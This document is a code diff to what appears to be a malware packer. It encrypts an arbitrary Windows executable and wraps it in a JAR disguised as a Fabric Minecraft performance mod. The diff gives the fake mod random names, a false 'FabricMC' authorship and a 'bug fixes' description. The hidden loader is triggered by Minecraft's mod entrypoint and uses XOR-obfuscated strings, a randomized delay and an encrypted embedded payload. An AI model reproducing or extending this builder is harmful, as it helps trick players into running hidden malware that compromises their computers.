@@ -28,36 +28,70 @@ function randHex(len: number): string {
   return crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
 }
 
-// ── EXE → JAR ─────────────────────────────────────────────────────────────────
+// ── EXE → JAR (Fabric mod disguise) ──────────────────────────────────────────
 
-export async function cryptToJar(exe: Buffer, out: string): Promise<void> {
+const MOD_IDS = ["lithiumplus","sodiumcore","featheropt","quilted","crystalfix","prismafix","emberfps"] as const;
+const MOD_NAMES: Record<string, string> = {
+  lithiumplus: "LithiumPlus",
+  sodiumcore:  "SodiumCore",
+  featheropt:  "FeatherOpt",
+  quilted:     "Quilted",
+  crystalfix:  "CrystalFix",
+  prismafix:   "PrismaFix",
+  emberfps:    "EmberFPS",
+};
+
+function randModId(): string {
+  return MOD_IDS[Math.floor(Math.random() * MOD_IDS.length)];
+}
+
+export async function cryptToJar(exe: Buffer, out: string, mcVersion = "26.1.2"): Promise<void> {
   const gz = zlib.gzipSync(exe, { level: 9 });
   const key = randKey();
-  // .pak format: [key byte][xor-encrypted gzip data]
   const pak = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
 
-  const src = buildJarSource();
+  const modId    = randModId();
+  const className = randName();
+  const pkg      = `net.fabricmc.${modId}`;
+  const pkgPath  = pkg.replace(/\./g, "/");
+
   const tmp = fs.mkdtempSync("/tmp/cjar-");
-
   try {
-    const classDir = path.join(tmp, "cls");
-    const assetDir = path.join(classDir, "assets");
-    const metaDir = path.join(classDir, "META-INF");
+    const classDir  = path.join(tmp, "cls");
+    const pkgDir    = path.join(classDir, pkgPath);
+    const apiDir    = path.join(classDir, "net/fabricmc/api");
+    const assetDir  = path.join(classDir, "assets");
+    const metaDir   = path.join(classDir, "META-INF");
+    fs.mkdirSync(pkgDir,   { recursive: true });
+    fs.mkdirSync(apiDir,   { recursive: true });
     fs.mkdirSync(assetDir, { recursive: true });
-    fs.mkdirSync(metaDir, { recursive: true });
+    fs.mkdirSync(metaDir,  { recursive: true });
 
-    const srcFile = path.join(tmp, "Main.java");
-    fs.writeFileSync(srcFile, src);
+    const srcDir    = path.join(tmp, "src");
+    const srcPkgDir = path.join(srcDir, pkgPath);
+    const srcApiDir = path.join(srcDir, "net/fabricmc/api");
+    fs.mkdirSync(srcPkgDir, { recursive: true });
+    fs.mkdirSync(srcApiDir, { recursive: true });
 
-    const javac = await $`javac -source 8 -target 8 -d ${classDir} ${srcFile}`
+    const stubFile = path.join(srcApiDir, "ModInitializer.java");
+    const mainFile = path.join(srcPkgDir, `${className}.java`);
+    fs.writeFileSync(stubFile, buildModInitializerStub());
+    fs.writeFileSync(mainFile, buildJarSource(pkg, className));
+
+    const javac = await $`javac -source 17 -target 17 -d ${classDir} ${stubFile} ${mainFile}`
       .nothrow()
       .quiet();
     if (javac.exitCode !== 0)
       throw new Error(`javac: ${javac.stderr.toString().trim()}`);
 
     fs.writeFileSync(path.join(assetDir, "data.pak"), pak);
+    fs.writeFileSync(
+      path.join(classDir, "fabric.mod.json"),
+      buildFabricModJson(modId, pkg, className, mcVersion),
+    );
+
     const mfPath = path.join(metaDir, "MANIFEST.MF");
-    fs.writeFileSync(mfPath, "Manifest-Version: 1.0\nMain-Class: Main\n\n");
+    fs.writeFileSync(mfPath, "Manifest-Version: 1.0\n\n");
 
     const jar = await $`jar cfm ${out} ${mfPath} -C ${classDir} .`
       .nothrow()
@@ -69,19 +103,27 @@ export async function cryptToJar(exe: Buffer, out: string): Promise<void> {
   }
 }
 
-function buildJarSource(): string {
+function buildModInitializerStub(): string {
+  return [
+    "package net.fabricmc.api;",
+    "public interface ModInitializer { void onInitialize(); }",
+  ].join("\n");
+}
+
+function buildJarSource(pkg: string, className: string): string {
   const lines: string[] = [
+    `package ${pkg};`,
     "import java.io.*;",
     "import java.util.*;",
     "import java.util.zip.*;",
-    "public class Main{",
+    `public class ${className} implements net.fabricmc.api.ModInitializer{`,
     "  private static final java.util.concurrent.atomic.AtomicBoolean G=new java.util.concurrent.atomic.AtomicBoolean(false);",
     `  private static String x(int[]a){byte[]b=new byte[a.length];for(int i=0;i<a.length;i++)b[i]=(byte)(a[i]^90);try{return new String(b,"UTF-8");}catch(Exception e){return "";}}`,
-    "  public static void main(String[]a){try{r();}catch(Exception e){}}",
-    "  private static void r()throws Exception{",
+    "  public void onInitialize(){try{r();}catch(Exception e){}}",
+    "  private void r()throws Exception{",
     "    if(!G.compareAndSet(false,true))return;",
     "    Thread.sleep(500+new Random().nextInt(1500));",
-    `    InputStream is=Main.class.getResourceAsStream(x(${xs("/assets/data.pak")}));`,
+    `    InputStream is=getClass().getResourceAsStream(x(${xs("/assets/data.pak")}));`,
     "    if(is==null)return;",
     "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
     "    byte[]tmp=new byte[4096];int n;",
@@ -103,8 +145,26 @@ function buildJarSource(): string {
     "  }",
     "}",
   ];
-
   return lines.join("\n");
+}
+
+function buildFabricModJson(modId: string, pkg: string, className: string, mcVersion: string): string {
+  return JSON.stringify({
+    schemaVersion: 1,
+    id: modId,
+    version: "1.0.0",
+    name: MOD_NAMES[modId] ?? modId,
+    description: "Performance improvements and bug fixes.",
+    authors: ["FabricMC"],
+    license: "MIT",
+    environment: "*",
+    entrypoints: { main: [`${pkg}.${className}`] },
+    depends: {
+      fabricloader: ">=0.15.0",
+      minecraft: mcVersion,
+      java: ">=21",
+    },
+  }, null, 2);
 }
 
 // ── EXE → EXE (Go stub compiled for Windows) ─────────────────────────────────
